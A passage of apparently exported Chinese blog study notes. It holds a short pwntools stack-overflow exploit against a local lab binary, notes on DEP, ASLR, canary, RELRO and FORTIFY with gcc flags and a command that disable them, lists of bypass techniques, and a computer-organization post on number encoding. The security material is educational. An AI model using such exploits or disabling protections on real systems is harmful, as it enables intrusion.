class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">## 构造与程序交互的对象</span></span><br><span class="line">sh = process(<span class="string">&#x27;./stack_example&#x27;</span>)</span><br><span class="line">success_addr = <span class="number">0x0804843b</span></span><br><span class="line"><span class="comment">## 构造payload</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x14</span> + <span class="string">&#x27;bbbb&#x27;</span> + p32(success_addr)</span><br><span class="line"><span class="comment">##这个&#x27;a&#x27;*14 是栈原本的大小，放入垃圾数据a，把传入的栈的全部填充</span></span><br><span class="line"><span class="comment">##+&#x27;bbbb&#x27;是把旧的ebp的位置覆盖掉。</span></span><br><span class="line"><span class="comment">##p32(success_addr) 是把返回的地址改成自己想要的地址。</span></span><br><span class="line"><span class="built_in">print</span> p32(success_addr)</span><br><span class="line"><span class="comment">## 向程序发送字符串</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">## 将代码交互转换为手工交互</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>保护机制（33）</title>
      <link href="/2023/05/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-33-%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
      <url>/2023/05/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-33-%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows保护机制"><a href="#Windows保护机制" class="headerlink" title="Windows保护机制"></a>Windows保护机制</h1><h2 id="数据保护"><a href="#数据保护" class="headerlink" title="数据保护"></a>数据保护</h2><p>(DEP) 是一项安全功能，可有助于防止计算机受到病毒和其它安全威胁的损坏。 有害程序可能尝试从为Windows 和其它授权程序保留的系统内存位置运行（也称为执行）代码，以攻击Windows。 这些类型的攻击可能会损害您的程序和文件</p><p>还有其他的：</p><p><a href="https://xineting.github.io/2018/11/03/windows%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">https://xineting.github.io/2018/11/03/windows%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</a></p><p>DEP全称Data Execution Prevention，是Windows平台的一个说法。早年的DEP分硬件DEP和软件DEP，软件DEP实际上是指SafeSEH。现在大部分提到DEP都是指硬件DEP，也叫NX(编译选项/NXCOMPAT)。</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230528162837575.png" alt="image-20230528162837575"></p><p>Linux上只有硬件DEP（因为异常处理并非SEH机制），但Linux上一般不用DEP来描述，而是仅仅用NX。</p><p>NX的作用是防止数据页上的数据被当成代码来执行，x86是通过PAE的扩充位来标志PTE内存页是否具有可执行权限。开启了NX后，数据页（首当其冲的就是堆页和堆栈页）就不再具有可执行权限。X64因为本身就富余扩展位，所以无需PAE即支持NX，原理一致。</p><p>比较老的CPU可能不支持PAE（设计上就没有扩展的4根地址总线），所以DEP也就形同虚设。</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230528162937978.png" alt="image-20230528162937978"></p><p>知道有这个DEP就暂时就这样吧</p><h2 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h2><p>ASLR全称Address Space Layout Randomization. 本质上是一种技术思想。应用程序的虚拟内存空间中有着堆、栈、共享库、PE映像等等模块，这些模块的地址是固定的。而因为其固定性，很多包含硬编码合适的地址的exp都一度相当稳定。</p><p>ASLR旨在把各种模块的地址在程序加载期间随机化处理，让exp的开发者无法硬编码地址。对不同的平台来说，ASLR的实现大同小异，但因为受限于平台原本加载方式的设计，所以表现上有些差异。</p><p>以Windows和Linux为例：</p><p>类似DEP，Windows的ASLR是“系统支持 + 程序链接选项开启”。</p><p>/dynamicbase一旦开启，程序每次启动时heap和stack、PEB、TEB都会变化，每次重启系统其PE映像也会发生变化 。</p><p>Linux的ASLR则是“系统支持 + PIE”，ASLR有0/1/2三个级别，0表示未开启，1表示随机化stack、libraries，2进一步随机化heap。</p><p>如果elf编译时使用了-fPIE选项(gcc)，则ELF被视为特殊的so，加载时也会随机化基址。</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230528163251474.png" alt="image-20230528163251474"></p><p>未开启ASLR，PE映像加载和PE文件头一致，stack每次都相同，heap每次则不同。</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230528163305425.png" alt="image-20230528163305425"></p><p>开启ASLR，PE映像加载和PE文件头不一致会重定向，每次运行stack和heap都不同，而系统重启前PEImage都相同。</p><h2 id="DEP-NX对抗"><a href="#DEP-NX对抗" class="headerlink" title="DEP/NX对抗"></a>DEP/NX对抗</h2><p>正面刚系列：</p><p>Ret2Libc</p><p>核心思想在于我不自己写shellcode，我通过布置栈上的参数去call已有的函数，此时ret不再是回到data页（比如栈），而是跳到某个函数（比如system()）。</p><p>ROP(Return Oriented Program)</p><p>ROP链实现原生的功能，由各种以ret [n]结尾的代码片段组成，称为gadget，然后通过控制调用链和栈上参数，step by step。</p><p>Windows因为历史原因，提供了各种Ring3层API来设置DEP的开闭，也提供VirtualProtect等一干Ring3层API来设置数据内存页面的可执行位。于是可以ROP + data页执行</p><p>攻击未开启DEP的模块（当前常见的比如浏览器中的JIT）</p><h2 id="ASLR-PIE对抗"><a href="#ASLR-PIE对抗" class="headerlink" title="ASLR+PIE对抗"></a>ASLR+PIE对抗</h2><p>Windows</p><p>攻击未启用ASLR的模块</p><p>对x86来说，由于ASLR只随机化高16位，可以仅覆盖低16位的地址</p><p>利用堆喷射(Heap Spray)到稳定地址(0x0c0c0c0c/0x06060606)</p><p>Leak Info泄露出模块基址</p><p>Linux</p><p>未开启PIE</p><p>Ret2plt</p><p>Got表劫持</p><p>Stack-pivot</p><p>Leak info泄露出模块基址</p><p>开启PIE</p><p>Leak info泄露出模块基址</p><h1 id="Linux保护机制"><a href="#Linux保护机制" class="headerlink" title="Linux保护机制"></a>Linux保护机制</h1><p>Linux ELF文件的保护主要有四种：Canary、NX、PIE、RELRO</p><h2 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h2><p>技术上表示最先的测试的意思。所以大家都用Canary来搞最先的测试。Stack Canary表示栈的报警保护。</p><p>在函数返回值之前添加的一串随机数（不超过机器字长）（也叫做cookie），末位为/x00（提供了覆盖最后一字节输出泄露Canary的可能），如果出现缓冲区溢出攻击，覆盖内容覆盖到Canary处，就会改变原本该处的数值，当程序执行到此处时，会检查Canary值是否跟开始的值一样，如果不一样，程序会崩溃，从而达到保护返回地址的目的。</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230528170616384.png" alt="image-20230528170616384"></p><p>总的来说，Canary参数表示着对栈的保护，防止栈溢出的一种保护，即在栈靠近栈底某个位置设置初值，防止栈溢出的一种保护。</p><p><strong>GCC用法：</strong></p><ul><li>gcc -o test test.c // 默认情况下，不开启Canary保护</li><li>gcc -fno-stack-protector -o test test.c //禁用栈保护</li><li>gcc -fstack-protector -o test test.c //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</li><li>gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码</li></ul><p>总的来说：</p><ul><li>-fno-stack-protector /-fstack-protector / -fstack-protector-all (关闭 / 开启 / 全开启)</li></ul><h2 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h2><p>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p><p>正常在栈溢出时通过跳转指令跳转至shellcode，但是NX开启后CPU会对数据区域进行检查，当发现正常程序不执行，并跳转至其他地址后会抛出异常，接下来不会继续执行shellcode，而是去转入异常处理，处理后会禁止shellcode继续执行</p><p><strong>GCC用法</strong></p><ul><li><p>gcc -o test test.c // 默认情况下，开启NX保护</p></li><li><p>gcc -z execstack -o test test.c // 禁用NX保护</p></li><li><p>gcc -z noexecstack -o test test.c // 开启NX保护</p></li><li><p>-z execstack / -z noexecstack (关闭 / 开启)</p></li></ul><h2 id="PIE-ASLR"><a href="#PIE-ASLR" class="headerlink" title="PIE(ASLR)"></a>PIE(ASLR)</h2><p>一般情况下NX（Windows平台上称为DEP）和地址空间分布随机化（PIE/ASLR）（address spacelayout randomization）会同时工作。内存地址随机化机制有三种情况：</p><p>0 - 表示关闭进程地址空间随机化。</p><p>1 - 表示将mmap的基地址，栈基地址和.so地址随机化</p><p>2 - 表示在1的基础上增加heap的地址随机化</p><p>该保护能使每次运行的程序的地址都不同，防止根据固定地址来写exp执行【payload】攻击。</p><p>可以防止Ret2libc方式针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码</p><p><strong>liunx下关闭PIE的命令如下</strong>：</p><ul><li>sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space</li></ul><p><strong>GCC用法：</strong></p><ul><li>gcc -o test test.c // 默认情况下，不开启PIE</li><li>gcc -fpie -pie -o test test.c // 开启PIE，此时强度为1</li><li>gcc -fPIE -pie -o test test.c // 开启PIE，此时为最高强度2</li><li>gcc -fpic -o test test.c // 开启PIC，此时强度为1，不会开启PIE</li><li>gcc -fPIC -o test test.c // 开启PIC，此时为最高强度2，不会开启PIE</li></ul><p>总：</p><ul><li>-no-pie / -pie (关闭 / 开启)</li></ul><h2 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h2><p>Relocation Read-Only (RELRO) 可以使程序某些部分成为只读的。它分为两种：Partial RELRO 和 FullRELRO，即：部分RELRO 和 完全RELRO。</p><p>部分RELRO 是 GCC 的默认设置，几乎所有的二进制文件都至少使用部分RELRO。这样仅仅只能防止全局变量上的缓冲区溢出从而覆盖 GOT。</p><p>完全RELRO 使整个 GOT 只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。</p><p>在Linux系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域。所以在安全防护的角度应尽量减少可写的存储区域</p><p>RELRO会设置符号重定向表格为只读或者程序启动时就解析并绑定所有动态符号，从而减少对GOT表的攻击。如果RELRO为Partial RELRO，就说明对GOT表具有写权限</p><p>主要用来保护重定位表段对应数据区域，默认可写</p><p>Partial RELRO：.got不可写，got.plt可写</p><p>Full RELRO：.got和got.plt不可写</p><p>got.plt可以简称为got表</p><p><strong>GCC用法</strong></p><ul><li><p>gcc -o test test.c // 默认情况下，是Partial RELRO</p></li><li><p>gcc -z norelro -o test test.c // 关闭，即No RELRO</p></li><li><p>gcc -z lazy -o test test.c // 部分开启，即Partial RELRO</p></li><li><p>gcc -z now -o test test.c // 全部开启</p></li><li><p>-z norelro / -z lazy / -z now (关闭 / 部分开启 / 完全开启)</p></li></ul><h2 id="FORTIFY"><a href="#FORTIFY" class="headerlink" title="FORTIFY"></a>FORTIFY</h2><p>fortify是轻微的检查，用于检查是否存在缓冲区溢出的错误。适用于程序采用大量的字符串或者内存操作函数，如:</p><hr><ul><li><strong>memcpy()</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">memcpy</span><span class="params">(<span class="type">void</span> *str1, <span class="type">const</span> <span class="type">void</span> *str2, <span class="type">size_t</span> n)</span></span><br></pre></td></tr></table></figure><p>从存储区str2复制n个字符到存储区str1</p><p>参数：</p><ul><li><p>str1 – 指向用于存储复制内容的目标数组，类型强制转换为 void* 指针</p></li><li><p> str2 – 指向要复制的数据源，类型强制转换为 void* 指针</p></li><li><p> n – 要被复制的字节数</p></li><li><p> 返回值：该函数返回一个指向目标存储区 str1 的指针</p></li></ul><hr><ul><li><strong>memset()</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">memset</span><span class="params">(<span class="type">void</span> *str, <span class="type">int</span> c, <span class="type">size_t</span> n)</span></span><br></pre></td></tr></table></figure><p>复制字符 c（一个无符号字符）到参数 str 所指向的字符串的前 n 个字符</p><p>参数：</p><ul><li><p>str – 指向要填充的内存块</p></li><li><p> c – 要被设置的值。该值以 int 形式传递，但是函数在填充内存块时是使用该值的无符号字符形式</p></li><li><p> n – 要被设置为该值的字节数</p></li><li><p> 返回值：该值返回一个指向存储区 str 的指针</p></li></ul><hr><ul><li><strong>strcpy()</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">strcpy</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *src)</span></span><br></pre></td></tr></table></figure><p>把 src 所指向的字符串复制到 dest，容易出现溢出</p><p>参数：</p><ul><li><p>dest – 指向用于存储复制内容的目标数组</p></li><li><p> src – 要复制的字符串</p></li><li><p> 返回值：该函数返回一个指向最终的目标字符串 dest 的指针</p></li></ul><hr><ul><li><strong>stpcpy()</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">char</span> *<span class="title function_">stpcpy</span><span class="params">(<span class="type">char</span> *dest,<span class="type">char</span> *src)</span></span><br></pre></td></tr></table></figure><p>把src所指由NULL借宿的字符串复制到dest所指的数组中</p><p> 说明：src和dest所指内存区域不可以重叠且dest必须有足够的空间来容纳src的字符串返回指向dest结尾处字符（NULL）的指针 </p><hr><ul><li> <strong>strncpy()</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">strncpy</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *src, <span class="type">size_t</span> n)</span></span><br></pre></td></tr></table></figure><p>把 src 所指向的字符串复制到 dest，最多复制 n 个字符。当 src 的长度小于 n 时，dest 的剩余部分将用空字节填充</p><p> 参数：</p><ul><li><p>dest – 指向用于存储复制内容的目标数组</p></li><li><p> src – 要复制的字符串</p></li><li><p> n – 要从源中复制的字符数</p></li><li><p> 返回值：该函数返回最终复制的字符串</p></li></ul><hr><ul><li><strong>strcat()</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">strcat</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *src)</span></span><br></pre></td></tr></table></figure><p>把 src 所指向的字符串追加到 dest 所指向的字符串的结尾</p><p>参数：</p><ul><li><p>dest – 指向目标数组，该数组包含了一个 C 字符串，且足够容纳追加后的字符串</p></li><li><p> src – 指向要追加的字符串，该字符串不会覆盖目标字符串</p></li><li><p> 返回值：</p></li></ul><hr><ul><li> <strong>strncat()</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">strncat</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *src, <span class="type">size_t</span> n)</span></span><br></pre></td></tr></table></figure><p>把 src 所指向的字符串追加到 dest 所指向的字符串的结尾，直到 n 字符长度为止</p><p>参数：</p><ul><li><p>dest – 指向目标数组，该数组包含了一个 C 字符串，且足够容纳追加后的字符串，包括额外的空字符</p></li><li><p> src – 要追加的字符串</p></li><li><p> n – 要追加的最大字符数</p></li><li><p> 返回值：该函数返回一个指向最终的目标字符串 dest 的指针</p></li></ul><hr><ul><li><strong>sprintf():PHP</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">sprintf</span>(format,arg1,arg2,arg++)</span><br></pre></td></tr></table></figure><p>arg1、arg2、++ 参数将被插入到主字符串中的百分号（%）符号处。该函数是逐步执行的。在第一个 % 符号处，插入 arg1，在第二个 % 符号处，插入 arg2，依此类推</p><p> 参数：</p><ul><li><p>format – 必需。规定字符串以及如何格式化其中的变量</p></li><li><p> arg1 – 必需。规定插到 format 字符串中第一个 % 符号处的参</p></li><li><p> arg2 – 可选。规定插到 format 字符串中第二个 % 符号处的参数</p></li><li><p> arg++ – 可选。规定插到 format 字符串中第三、四等等 % 符号处的参数</p></li><li><p> 返回值：返回已格式化的字符串</p></li></ul><hr><ul><li><strong>snprintf()</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">snprintf</span> <span class="params">( <span class="type">char</span> * str, <span class="type">size_t</span> size, <span class="type">const</span> <span class="type">char</span> * format, ... )</span></span><br></pre></td></tr></table></figure><p>设将可变参数(…)按照 format 格式化成字符串，并将字符串复制到 str 中，size 为要写入的字符的最大数目，超过 size 会被截断</p><p> 参数:</p><p>str – 目标字符串</p><ul><li><p> size – 拷贝字节数(Bytes)如果格式化后的字符串长度大于 size</p></li><li><p> format – 格式化成字符串</p></li><li><p> 返回值：如果格式化后的字符串长度小于等于 size，则会把字符串全部复制到 str 中，并给其后添加一个字符串结束符 \0。 如果格式化后的字符串长度大于 size，超过 size 的部分会被截断，只将其中的(size-1) 个字符复制到 str 中，并给其后添加一个字符串结束符 \0，返回值为欲写入的字符串长度</p></li></ul><hr><ul><li><strong>vsprintf():PHP</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">vsprintf</span>(format,argarray)</span><br></pre></td></tr></table></figure><p>与 sprintf() 不同，vsprintf() 中的参数位于数组中。数组元素将被插入到主字符串中的百分号（%）符号处。该函数是逐步执行的</p><p>参数：</p><ul><li><p>format – 必需。规定字符串以及如何格式化其中的变量</p></li><li><p> argarray – 必需。带有参数的一个数组，这些参数会被插到 format 字符串中的 % 符号处</p></li><li><p> 返回值：以格式化字符串的形式返回数组值</p></li></ul><hr><ul><li><strong>vsnprintf()</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vsnprintf</span> <span class="params">(<span class="type">char</span> * s, <span class="type">size_t</span> n, <span class="type">const</span> <span class="type">char</span> * format, va_list arg )</span></span><br></pre></td></tr></table></figure><p>将格式化数据从可变参数列表写入大小缓冲区</p><p>如果在printf上使用格式，则使用相同的文本组成字符串，但使用由arg标识的变量参数列表中的元素而不是附加的函数参数，并将结果内容作为C字符串存储在s指向的缓冲区中 （以n为最大缓冲区容量来填充）。如果结果字符串的长度超过了n-1个字符，则剩余的字符将被丢弃并且不被存储，而是被计算为函数返回的值。在内部，函数从arg标识的列表中检索参数，就好像va_arg被使用了一样，因此arg的状态很可能被调用所改变。在任何情况下，arg都应该在调用之前的某个时刻由va_start初始化，并且在调用之后的某个时刻，预计会由va_end释放</p><p>参数：</p><ul><li><p>s – 指向存储结果C字符串的缓冲区的指针，缓冲区应至少有n个字符的大小</p></li><li><p> n – 在缓冲区中使用的最大字节数，生成的字符串的长度至多为n-1，为额外的终止空字符留下空，size_t是一个无符号整数类型</p></li><li><p> format – 包含格式字符串的C字符串，其格式字符串与printf中的格式相同</p></li><li><p> arg – 标识使用va_start初始化的变量参数列表的值</p></li><li><p> 返回值：如果n足够大，则会写入的字符数，不包括终止空字符。如果发生编码错误，则返回负数。注意，只有当这个返回值是非负值且小于n时，字符串才被完全写入</p></li></ul><hr><ul><li><strong>gets():</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">gets</span><span class="params">(<span class="type">char</span> *str)</span></span><br></pre></td></tr></table></figure><p>从标准输入 stdin 读取一行，并把它存储在 str 所指向的字符串中。当读取到换行符时，或者到达文件末尾时，它会停止，具体视情况而定</p><p>参数：str – 这是指向一个字符数组的指针，该数组存储了 C 字符串 返回值：如果成功，该函数返回 str。如果发生错误或者到达文件末尾时还未读取任何字符，则返回NULL </p><p><strong>GCC用法</strong>：</p><p>gcc -D_FORTIFY_SOURCE=1 仅仅只在编译时进行检查（尤其是#include &lt;string.h&gt;这种文件头）</p><p>gcc -D_FORTIFY_SOURCE=2 程序执行时也会进行检查（如果检查到缓冲区溢出，就会终止程序）</p><p>在-D_FORTIFY_SOURCE=2时，通过对数组大小来判断替换strcpy、memcpy、memset等函数名，从而达到防止缓冲区溢出的作用</p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>运算方法和运算器（2）</title>
      <link href="/2023/05/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-2-%E8%BF%90%E7%AE%97%E6%96%B9%E6%B3%95%E5%92%8C%E8%BF%90%E7%AE%97%E5%99%A8/"/>
      <url>/2023/05/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-2-%E8%BF%90%E7%AE%97%E6%96%B9%E6%B3%95%E5%92%8C%E8%BF%90%E7%AE%97%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="1-数据与文字的表示方法"><a href="#1-数据与文字的表示方法" class="headerlink" title="1.数据与文字的表示方法"></a>1.数据与文字的表示方法</h1><ul><li><p>计算机中使用的数据可分成两大类</p><ol><li><p>符号数据:非数字符号的表示  ASCII、汉字、图形</p><p>2.数值数据:数字数据的表示方式（定点、浮点）</p></li></ol></li><li><p>计算机数字和字符的表示方法应有利于数据的存储、加工(处理)、传送；</p></li><li><p>编码：用少量、简单的基本符号，选择合适的规则表示尽量多的信息，同时利于信息处理（速度、方便）</p></li></ul><h2 id="1-数据格式"><a href="#1-数据格式" class="headerlink" title="1 数据格式"></a>1 数据格式</h2><h3 id="1-定点表示法"><a href="#1-定点表示法" class="headerlink" title="1.定点表示法"></a>1.定点表示法</h3><ul><li>所有数据的小数点位置固定不变</li><li>理论上位置可以任意，但实际上将数据表示有两种方法（小数点位置固定-定点表示法/定点格式）：<ol><li>纯小数</li><li>纯整数</li></ol></li></ul><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230527201428118.png" alt="image-20230527201428118"></p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230527201520154.png" alt="image-20230527201520154"></p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230527201620034.png" alt="image-20230527201620034"></p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230527201715510.png" alt="image-20230527201715510"></p><h3 id="2-浮点表示法"><a href="#2-浮点表示法" class="headerlink" title="2.浮点表示法"></a>2.浮点表示法</h3><p>小数点位置随<strong>阶码</strong>【也就是下面的指数E】不同而浮动</p><ul><li>阶码；在表示一个浮点数的时候，要给出指数，用整数形式表示，常常称为阶码。</li></ul><p>小数点位置随比例因子的不同而在一定范围内可以自由浮动，所以称为浮点数</p><p>任何一个数N 可以表示为：</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230527202058629.png" alt="image-20230527202058629"></p><p>尾数：是一个纯小数</p><p>E：是比例因子的指数，称为浮点数的指数，是一个整数</p><p>基数：一般是2或者10</p><p>浮点数的规格化表示：</p><p>(1.75)10 = 1.11 × 2 0 (规格化表示)= 0.111 × 2 1 = 0.0111 × 2 2</p><h3 id="3-十进制数串的表示方法"><a href="#3-十进制数串的表示方法" class="headerlink" title="3.十进制数串的表示方法"></a>3.十进制数串的表示方法</h3><ul><li>字符串形式</li></ul><p>一个字节存放一个十进制的数位或符号位。在主存中，这样的一个十进制数占用连续的多字节，故为了指明指明这样一个数，需要给出该数在主存中的起始地址和位数（串的长度）。这种方式表示的十进制字符串主要用在非数值计算的应用领域。</p><ul><li>压缩的十进制数串形式</li></ul><p>也就是一个字节存放2个十进制的数。比前一种形式更节省存储空间，有便于直接完成10进制的算数运算。</p><h2 id="2-数的机器码表示"><a href="#2-数的机器码表示" class="headerlink" title="2.数的机器码表示"></a>2.数的机器码表示</h2><p>首先我们要知道几个概念</p><ul><li><p>真值：一般书写的数</p></li><li><p>机器码：机器中表示的数，要解决在计算机内部数的正，负，和小数点运算的问题</p><ul><li>源码</li><li>反码</li><li>补码</li><li>移码</li></ul></li></ul><h3 id="1-原码表示法"><a href="#1-原码表示法" class="headerlink" title="1.原码表示法"></a>1.原码表示法</h3><ul><li><strong>定点小数   x0 . x1 x2…xn</strong></li></ul><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230527221719187.png" alt="image-20230527221719187"></p><p>例子：</p><p>x=+0.11001110 ， y=-0.11001110 </p><p>[x]原=0.11001110 ，[y]原=1.11001110</p><ul><li><strong>定点整数 X0X1X2…Xn</strong></li></ul><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230527222654904.png" alt="image-20230527222654904"></p><p>例子：</p><p>x=+11001110，y=-11001110</p><p>[x]原=011001110 [y]原=111001110</p><ul><li><strong>特点</strong><ul><li>表示简单，容易进行真值之间进行转换，实现乘除运算规则简单</li><li>进行加减法运算十分麻烦</li></ul></li></ul><h3 id="2-补码表示法"><a href="#2-补码表示法" class="headerlink" title="2.补码表示法"></a>2.补码表示法</h3><ul><li>例子</li></ul><p>现为北京时间下午4点，但钟表显示为7点。有两种办法校对：</p><p>(1) 做减法 7-3 = 4 (逆时针退3格)</p><p>(2) 做加法 7+9 = 16 (顺时针进9格)</p><p>16 (mod 12) = 16-12 = 4 (以12为模，变成4)</p><p>mod 就是取模一样的，在数学上就是叫同余式。</p><ol><li>-4=+ 8 （mod 12 ）</li><li>-5 = +7（mod 12）</li></ol><ul><li>补码表示法</li></ul><p>定义：正数的补码就是正数的本身，负数的补码是原负数加上模。</p><p>计算机运算受字长限制,属于有模运算. </p><ol><li> 定点小数x0 .x1 x2…xn ，以2为模</li></ol><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230527225057981.png" alt="image-20230527225057981"></p><ol><li> 定点整数x0 .x1 x2…xn ，以2^n+1为模</li></ol><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230527225335038.png" alt="image-20230527225335038"></p><p>补码最大的优点就是将减法运算转换成加法运算。通常不按表达式求补码，而通过反码来得到。</p><h3 id="3-反码表示法"><a href="#3-反码表示法" class="headerlink" title="3.反码表示法"></a>3.反码表示法</h3><ul><li><p>定义：正数的表示和原，补码相同，负数的补码符号位为1，数值位将源码的数值按位取反。</p><ul><li>定点小数x0.x1x2…xn</li></ul><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20230527230202856.png" alt="image-20230527230202856"></p></li></ul><p>X1=+0.1011011 , [X1] 反 =0.1011011</p><p>X2= -0.1011011 , [X2] 反 =1.0100100</p><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20230527230256166.png" alt="image-20230527230256166"></p><ul><li><p>[x ]补=[x ]反+2^-n（证明见书）</p></li><li><p>反码表示有正0和负0之分</p></li></ul><h3 id="4-移码表示方法"><a href="#4-移码表示方法" class="headerlink" title="4.移码表示方法"></a>4.移码表示方法</h3><ul><li>移码表示法（用在阶码中）<ul><li>定点整数定义 [x]移=2n+x 2n &gt;x≥-2n</li><li>00000000<del>11111111(-2n</del>2n -1)</li></ul></li></ul><p>例</p><p> x=+1011111 </p><p>原码为01011111</p><p>补码为01011111 </p><p>反码为01011111</p><p>移码为11011111</p><p>特点：移码和补码尾数相同，符号位相反</p><h3 id="5-题目："><a href="#5-题目：" class="headerlink" title="5.题目："></a>5.题目：</h3><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230527231205384.png" alt="image-20230527231205384"></p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230527231225296.png" alt="image-20230527231225296"></p><p>例八：</p><p>设机器字长16位，定点表示，尾数15位</p><p>(1)定点原码整数表示时,最大正数是多少?最小负数是多少?</p><p>0 111 111 111 111 111 最大正整数</p><p>​    x＝(215 －1)10＝(＋32767)10</p><p>1 111 111 111 111 111 最小负整数</p><p>​    x＝(1－2 15)10＝－(215 －1)10＝(－32767)10</p><p>(2)定点原码小数表示 ，最大正数是多少?最小负数是多少?</p><p>0 111 111 111 111 111 最大正小数</p><p>x＝(1－2 15)10</p><p>1 111 111 111 111 111 最小负小数</p><p>x＝－(1－ 2 15)10</p><p>例九：</p><p>假设由S，E，M三个域组成的一个32位二进制字所表示的非零规格话浮点数x，真值表示为：<img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20230528012952908.png" alt="image-20230528012952908"></p><p>问：它所表示的规格化的最大正数，最小正数，最大负数，最小负数是多少？</p><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20230528013135259.png" alt="image-20230528013135259"></p><h2 id="3-字符串和字符串的表示方法"><a 